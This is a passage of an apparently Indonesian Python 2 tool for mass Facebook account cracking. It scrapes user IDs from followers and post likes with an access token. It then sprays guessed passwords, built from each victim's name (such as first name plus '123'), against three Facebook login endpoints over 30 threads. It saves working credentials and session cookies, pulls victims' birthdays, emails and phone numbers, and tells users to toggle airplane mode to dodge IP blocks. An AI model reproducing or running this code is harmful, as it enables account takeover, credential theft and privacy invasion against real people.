        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        ah  = ('dump/' + mmk + '.json').replace(' ', '_')
        ys  = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ah)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()

# dump id dari followers hehe
def followers(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id follow  : '%(N,O,N))
        mmk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        ah  = ('dump/' + mmk + '.json').replace(' ', '_')
        ys  = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ah)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()

# dump id dari postingan hehe
def postingan(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id posting : '%(N,O,N))
        ppk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        ahh = ('dump/' + ppk + '.json').replace(' ', '_')
        ys  = open(ahh, 'w')
        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari like postingan'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ahh,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ahh)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()

# cek ingfo
def cek_ingfo(kontol):
    try:
        user = raw_input("\n [%s+%s] masukan id atau username : "%(O,N))
        if user == '':
            print "\n [%s!%s] jangan kosong bro"%(M,N);cek_ingfo(kontol)
        url = ("https://lookup-id.com/")
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        else:
            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
        halaman = requests.post(url, data = payload).text.encode("utf-8")
        sop_ = BeautifulSoup(halaman, "html.parser")
        email_ = sop_.find("span", id = "code")
        idt = email_.text
        if user == "me":
            idt = "me"
        x = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt, kontol)).json()
        nmaa = x['name']
    except (KeyError, IOError):
        nmaa = '%s-%s'%(M,N)
    print '\n  * Ingformasi akun Facebook *';time.sleep(0.03)
    print '\n [*] nama lengkap : %s'%(nmaa);time.sleep(0.03)
    try:
    	ndpn = x['first_name']
    except (KeyError, IOError):
    	ndpn = '%s-%s'%(M,N)
    print ' [*] nama depan   : %s'%(ndpn);time.sleep(0.03)
    try:
    	nmbl = x['last_name']
    except (KeyError, IOError):
    	nmbl = '%s-%s'%(M,N)
    print ' [*] nama belakang: %s'%(nmbl);time.sleep(0.03)
    try:
    	hwhs = x['username']
    except (KeyError, IOError):
    	hwhs = '%s-%s'%(M,N)
    print ' [*] username fb  : %s'%(hwhs);time.sleep(0.03)
    try:
    	asu = x['id']
    except (KeyError, IOError):
    	asu = '%s-%s'%(M,N)
    print ' [*] id facebook  : %s'%(asu);time.sleep(0.03)
    print '\n  * data-data akun facebook *\n';time.sleep(0.03)
    try:
    	emai = x['email']
    except (KeyError, IOError):
    	emai = '%s-%s'%(M,N)
    print ' [*] gmail facebook : %s'%(emai);time.sleep(0.03)
    try:
    	nmrr = x['mobile_phone']
    except (KeyError, IOError):
    	nmrr = '%s-%s'%(M,N)
    print ' [*] nomor telepon  : %s'%(nmrr);time.sleep(0.03)
    try:
    	ttll = x['birthday']
        month, day, year = ttll.split("/")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
        year = '%s-%s'%(M,N)
    print ' [*] tanggal lahir  : %s %s %s '%(day,month,year);time.sleep(0.03)
    try:
    	jenis = x['gender'].replace("female", "Perempuan").replace("male", "Laki-laki")
    except (KeyError, IOError):
    	jenis = ''
    print ' [*] jenis kelamin  : %s '%(jenis)
    try:
    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    except:pass
    print ' [*] jumblah teman  : %s'%str(len(id));time.sleep(0.03)
    try:
    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
    	pengikut = '%s-%s'%(M,N)
    print ' [*] total followers: %s'%(pengikut);time.sleep(0.03)
    try:
    	lins = x['link']
    except (KeyError, IOError):
    	lins = '%s-%s'%(M,N)
    print ' [*] link facebook  : %s'%(lins);time.sleep(0.03)
    try:
    	stas = x['relationship_status']
    except (KeyError, IOError):
    	stas = '%s-%s'%(M,N)
    try:
    	dgn = '''dengan %s'''%(x['significant_other']['name'])
    except (KeyError, IOError):
    	dgn = '%s-%s'%(M,N)
    except: pass
    print ' [*] status hubungan: %s %s'%(stas,dgn);time.sleep(0.03)
    try:
    	bioo = x['about']
    except (KeyError, IOError):
    	bioo = '%s-%s'%(M,N)
    except: pass
    print ' [*] tentang status : %s'%(bioo);time.sleep(0.03)
    try:
    	dari = x['hometown']['name']
    except (KeyError, IOError):
    	dari = '%s-%s'%(M,N)
    except: pass
    print ' [*] kota asal      : %s'%(dari);time.sleep(0.03)
    try:
    	tigl = x['location']['name']
    except (KeyError, IOError):
    	tigl = '%s-%s'%(M,N)
    except: pass
    print ' [*] tinggal di     : %s'%(tigl);time.sleep(0.03)
    try:
    	tzim = x['timezone']
    except (KeyError, IOError):
    	tzim = '%s-%s'%(M,N)
    except: pass
    print ' [*] zona waktu     : %s'%(tzim);time.sleep(0.03)
    try:
    	jam  = x['updated_time'][11:19]
    	uptd = x['updated_time'][:10]
        year, month, day = uptd.split("-")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	year = '%s-%s'%(M,N)
        month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
    except:pass
    print ' [*] terakhir di updated pada tanggal %s bulan %s tahun %s jam %s'%(day, month, year, jam);time.sleep(0.03)
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
    jalan('\n [%s✓%s] berhasil mengechek data² akun facebook\n\n'%(O,N));exit()

# cek ingfo sc
def info_tools():
    os.system('clear')
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    print '\n %s[%s>%s] Yt       : Yayan XD.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Author   : Moch Yayan Juan Alvredo XD.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Github   : https://github.com/Yayan-XD'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Facebook : https://www.facebook.com/KM39453'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/Yayanxyz'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Instagram: https://www.instagram.com/yayanxd_'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Blogspot : https://squadcyberpeopleteam.blogspot.com'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()

### ganti user agent
def seting_yntkts():
    print '\n (%s1%s) ganti user agent'%(O,N)
    print ' (%s2%s) check user agent'%(O,N)
    ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
    if ytbjts == '':
        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);time.sleep(2);seting_yntkts()
    elif ytbjts =='1':
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts =='2':
        check_yntkts()
    else:
        print '\n %s[%s×%s] input yang bener'%(N,M,N);time.sleep(2);seting_yntkts()

# User Agent baru
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    print '\n %s(%s•%s) notice me: cari User Agent di google chrome.'%(N,O,N)
    print ' (%s×%s) ketik User Agent atau My User Agent....\n'%(M,N)
    anjng = raw_input(' [%s?%s] Masukan User Agent :%s '%(O,N,H))
    if anjng == '':
        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
    try:
        open('YNTKTS.txt', 'w').write(anjng);time.sleep(2)
        jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    except:pass

# Cek User Agent
def check_yntkts():
    try:
        user_agent = open('YNTKTS.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
    print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
    raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()

# mulai ngecrot awokawokawokkawok
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n [%s?%s] masukan file : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu bro cek nomor 1 sampai 4'%(N,M,N,M,self.apk,N);time.sleep(3)
            raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
        ___yayanganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
            while True:
                pwek = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
                print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N)
                elif len(pwek)<=5:
                    print '\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__yan__()
                        elif cin == '1':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '2':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '3':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb,__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__yan__()
                    print '\n [ pilih method login - silahkan coba satu² ]\n'
                    print ' [%s1%s]. method API (fast)'%(O,N)
                    print ' [%s2%s]. method mbasic (slow)'%(O,N)
                    print ' [%s3%s]. method mobile (super slow)'%(O,N)
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print '\n [ pilih method login - silahkan coba satu² ]\n'
            print ' [%s1%s]. method API (fast)'%(O,N)
            print ' [%s2%s]. method mbasic (slow)'%(O,N)
            print ' [%s3%s]. method mobile (super slow)'%(O,N)
            self.__pler__()
        else:
            print '\n %s[%s×%s] y/t goblok!'%(N,M,N);time.sleep(2);moch_yayan()
        return

    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if response.status_code != 200:
                sys.stdout.write('\r %s[%s!%s] IP terblokir hidupkan mode pesawat 5 detik'%(N,M,N)),
                sys.stdout.flush()
                loop +=1
                self.__api__()
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __pler__(self):
        yan = raw_input('\n [*] method : ')
        if yan == '':
            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('2', '02'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('3', '03'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)

        else:
            print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__pler__()

if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()